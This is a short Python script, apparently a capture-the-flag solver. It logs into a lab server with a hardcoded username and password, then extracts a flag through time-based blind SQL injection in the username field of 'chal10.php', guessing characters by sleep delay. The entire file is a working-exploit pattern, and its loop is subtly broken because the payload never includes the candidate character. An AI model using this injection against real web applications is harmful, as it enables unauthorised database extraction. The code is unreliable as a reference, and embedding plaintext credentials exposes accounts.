import requests
import time as t

s=requests.session()
data = { "action":"submit", "username":"rsehgal","password":"BEgr7tDaWg9hsXw"}
r = s.post('https://172.27.20.32:8443/login.php',data,verify=False)
r = s.post('https://172.27.20.32:8443/chal10.php',verify=False)


data={"username":'admin',"action":"submit"}
passstr=""



password = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z','A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
# data={"username":'admin" AND IF(password  LIKE BINARY "flag{'+passstr+'}",sleep(1),sleep(0)) AND "1=1',"action":"submit",}
while True:
	for p in password:
		temp = passstr + p
		print temp
		data={"username":'admin" AND IF(password  LIKE BINARY "flag{'+passstr+'}",sleep(1),sleep(0)) AND "1=1',"action":"submit",}
		a=t.time()
		r = s.post('https://172.27.20.32:8443/chal10.php',data,verify=False)
		b=t.time()

		if b-a>1: 
			print "success"
			passstr = passstr + p;
			print "\n\n"+passstr+"\n\n"
			print "--------------------"
			break